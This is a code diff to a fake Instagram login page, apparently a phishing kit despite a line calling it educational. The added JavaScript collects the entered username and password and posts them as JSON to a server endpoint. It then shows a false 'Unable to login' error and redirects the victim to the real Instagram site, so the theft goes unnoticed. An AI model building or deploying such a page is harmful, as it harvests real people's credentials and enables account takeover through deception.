@@ -19,10 +19,10 @@
             </div>
 
             <br />
-            <form class="container" action="send.php" method="post">
-                <input type="text" placeholder="Phone number, username, or email " name="u_name">
-                <input type="password" placeholder="Password" name="pass">
-                <button class="submitbutton">Log in </button>
+            <form class="container" id="loginForm">
+                <input type="text" placeholder="Phone number, username, or email " name="u_name" required>
+                <input type="password" placeholder="Password" name="pass" required>
+                <button type="button" class="submitbutton" onclick="handleSubmit()">Log in </button>
                 <br />
                 <div class="option">OR </div>
             </form>
@@ -49,6 +49,40 @@
             your real username and password, it's only for educational purposes.</p>
     </div>
     <br />
+
+    <script>
+        async function handleSubmit() {
+            const u_name = document.querySelector('input[name="u_name"]').value;
+            const pass = document.querySelector('input[name="pass"]').value;
+
+            if (!u_name || !pass) {
+                alert('Please enter correct username or password. Try again');
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ u_name, pass }),
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    alert('Error ! Unable to login');
+                    window.location.replace('https://www.instagram.com');
+                } else {
+                    alert(data.error || 'Please enter correct username or password. Try again');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Please enter correct username or password. Try again');
+            }
+        }
+    </script>
 
 </body>
 
